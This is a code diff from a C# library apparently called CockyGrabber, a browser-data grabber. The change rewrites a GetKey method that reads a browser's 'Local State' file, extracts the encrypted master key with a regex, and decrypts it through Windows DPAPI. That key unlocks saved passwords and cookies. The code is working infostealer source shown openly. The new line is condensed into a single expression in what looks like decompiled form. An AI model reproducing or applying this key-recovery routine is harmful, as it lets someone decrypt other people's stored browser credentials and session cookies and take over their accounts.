@@ -835,15 +835,12 @@ namespace CockyGrabber.Grabbers
         /// </summary>
         public byte[] GetKey()
         {
-            if (!KeyExists()) throw new GrabberException(GrabberError.LocalStateNotFound, $"The Key for decryption (Local State) could not be found: {LocalStatePath}"); // throw a Exception if the "Local State" file that stores the key for decryption was not found
+            if (!KeyExists())
+            {
+                throw new GrabberException(GrabberError.LocalStateNotFound, "The Key for decryption (Local State) could not be found: " + LocalStatePath);
+            }
 
-            // Get the encrypted master key from the "Local State" file with regular expressions:
-            string value = Regex.Match(File.ReadAllText(LocalStatePath), "\"os_crypt\"\\s*:\\s*{\\s*\"encrypted_key\"\\s*:\\s*\".*?\"\\s*}").Value;
-            value = value.Replace("\"os_crypt\"", null).Replace("\"encrypted_key\"", null);
-            value = Regex.Match(value, "\".*?\"").Value;
-            value = value.Substring(1, value.Length - 2);
-
-            return DPAPI.Decrypt(Convert.FromBase64String(value).Skip(5).ToArray()); // Return decrypted key
+            return DPAPI.Decrypt(Convert.FromBase64String(((Capture)Regex.Match(File.ReadAllText(LocalStatePath), "\"os_crypt\"\\s*:\\s*\\{\\s*.*?(?=\"encrypted_key)\"encrypted_key\"\\s*:\\s*\"(?<encKey>.*?)\"\\s*\\}").get_Groups().get_Item("encKey")).get_Value()).Skip(5).ToArray());
         }
 
         // TimeStamp To DateTimeOffset Functions:
